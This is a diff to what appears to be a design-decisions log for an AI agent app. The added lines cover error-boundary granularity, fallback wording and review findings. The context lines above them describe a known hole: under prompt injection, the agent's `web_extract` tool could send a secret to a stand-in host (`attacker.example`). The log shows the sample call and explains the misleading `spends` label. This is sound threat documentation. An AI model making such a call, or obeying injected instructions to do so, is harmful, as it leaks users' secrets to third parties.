@@ -2409,3 +2409,15 @@ numeric second argument.
 **Residual hole, documented at `evaluate()` rather than left implicit:** a connector tool (named `mcp.<serverId>.<tool>` — see the row above) matches nothing and is allowed. The rail shows it (`provenance: 'mcp'|'unmapped'`, `described: false`) so it is visible, not hidden — but it is not gated.
 
 **`web_extract` is an exfiltration channel and `spends` does not say so.** `url-guard.ts` refuses only localhost/.local/.internal, so any PUBLIC url the agent names is fetched; under prompt injection `web_extract('https://attacker.example/?x=<secret>')` hands data to a third party that sees the request, unrecoverably. By this design's own definition that is `outward`. It ships as `spends` because marking it `outward` makes the lint force a hold on every page read — a live-deployment UX decision, not a classification one (TASK-330). The first draft of the `spends` doc claimed "no third-party-visible effect", which was simply false; corrected to a money-only claim. Do not read `spends` as "safe".
+
+## TASK-273 (2026-09-03) — error-boundary granularity: per-surface + app last-resort
+| Decision | Rationale | Alternatives |
+| Per-surface boundaries (`chat`, `chat-sidebar`, `chat-thread`, `workspace`) plus one app-level boundary in `main.tsx`, not a single app-level net | Acceptance leans per-surface for chat: a broken thread panel must not take the sidebar (or vice versa). The `main.tsx` root boundary covers throws above every surface (boot gate, providers). Each boundary is one JSX line once the reusable component exists, so granularity is cheap. | Single app-level boundary (rejected: whole page degrades to one fallback — barely better than blank); per-component boundaries everywhere (rejected: noise, no evidence any finer split pays). |
+| Fallback copy: "This part hit a snag / Your chats and work are safe / Try again / Reload page", raw error to console only | ux-design lenses: plain language + one concrete next action, "we"-adjacent blameless voice, never a stack trace on screen (raw error may carry untrusted server content). | Custom fallback per surface (deferred: `fallback` prop exists if a surface earns one). |
+
+## TASK-273 review (2026-09-03) — 4 findings, 3 fixed, 1 deferred
+| Finding | Verdict |
+| No test covered App/main wiring | Fixed: `error-boundary-wiring.test.tsx` mocks Thread to throw, asserts fallback + surviving sidebar. Bite-verified red against boundary-free App from `main`. |
+| ToastStack inside chat boundary | Fixed: moved outside the boundary (still inside UserProvider), matching the workspace branch. |
+| Root boundary inside BrandingProvider | Fixed: moved outside in `main.tsx`. |
+| Boundary never resets on navigation (stale fallback after session switch) | DEFERRED as follow-up: needs a reset key (e.g. activeSessionId) on the thread boundary, which changes Thread unmount semantics (composer-draft loss risk) — a behavior change that deserves its own card, not a drive-by. Fallback's Try-again recovers today. |
